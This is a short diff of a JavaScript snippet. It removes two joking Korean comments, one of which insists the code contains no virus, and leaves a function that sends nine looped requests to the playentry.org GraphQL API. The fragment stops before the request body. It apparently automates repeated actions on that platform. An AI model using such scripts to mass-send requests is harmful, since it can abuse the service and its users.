@@ -1,5 +1,3 @@
-//김잔상은 귀여워요 >_<
-//바이러스같은건 없답니다! >3<
 function cc () {for(let i=0;i<9;i++){
 fetch("https://playentry.org/graphql", {
   "headers": {
